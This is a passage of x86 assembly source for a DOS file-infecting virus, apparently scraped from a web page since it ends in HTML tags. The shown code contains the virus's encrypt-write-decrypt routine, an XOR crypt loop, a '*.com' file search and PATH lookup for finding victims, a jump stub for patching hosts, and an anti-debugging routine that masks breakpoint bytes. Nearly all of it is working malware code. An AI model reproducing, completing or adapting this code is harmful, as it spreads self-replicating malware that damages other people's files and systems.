l27:             db offset (t28-t27),offset (t27-data_begin)
l28:             db offset (t29-t28),offset (t28-data_begin)
;
l31:             db offset (t32-t31),offset (t31-data_begin)
l32:             db offset (t33-t32),offset (t32-data_begin)
l33:             db offset (t34-t33),offset (t33-data_begin)
l34:             db offset (t35-t34),offset (t34-data_begin)
l35:             db offset (t36-t35),offset (t35-data_begin)
l36:             db offset (t37-t36),offset (t36-data_begin)
l37:             db offset (t38-t37),offset (t37-data_begin)
l38:             db offset (t39-t38),offset (t38-data_begin)
;
;
;
; this routine is relocated after the end of data area
; this routine encrypts, writes, and decrypts the virus code
;
begin1:
                getloc  cx,dat2 ; get off (data_end-entry2) plus max_msk
                getloc  ax,dat1 ; get decode ket
                mov     di,si ; and set the begin encrypt address
                sub     di,offset (data_begin-entry2)
                call    crypt
                mov     ah,040h
                mov     cx,offset data_end-offset entry
                mov     dx,si
                sub     dx,offset data_begin-offset entry
                doscall
                pushf ; save the status of the write
                push    ax
                getloc  cx,dat2 ; get off (data_end-entry2) plus max_msk
                getloc  ax,dat1
                mov     di,si
                sub     di,offset (data_begin-entry2)
                call    crypt
                pop     ax      ; restore the dos write's status
                popf
                ret
;
crypt:
                xor     [di],ax
                xor     [di],cx
                inc     ax
                inc     di
                loop    crypt
                ret
end1:
;
; global work space and constants
;
old_code:       db 090h,090h,090h
jump_code:      db 0e9h,0,0
com_search:     db '*.com',0
path_chars:     db 'path='
file_name:      db 40h dup (0)
my_dta:         db 2bh dup (0)
                db 0,0,0

data_end        label near
ifdef stopdebug
;
scan_bytes      db 0cch,090h
;
precrypt:
                mov bp,sp   ; allocate locals
                sub sp,local_stack
                doscall 02ch  ; seed the random number generator
                xor dx,cx
                setloc rand_seed,dx
                call random
                mov di,offset start
                push ds
                pop es
lp999:
                mov cx,08000h
                mov si,offset scan_bytes
                lodsb
                repnz scasb
                cmp cx,0
                je done998
                cmp di,offset data_end
                jge done998
                lodsb
                scasb
                jnz lp999
                call random
                getloc ax,rand_seed
                dec di
                mov [di],al
                inc di
                xor [di],al
                inc di ; skip the masked byte
                jmp short lp999
done998:
                mov sp,bp
                ret
endif

code		ends
		end	start

</textarea></td></tr></table></body></html>
></call_type>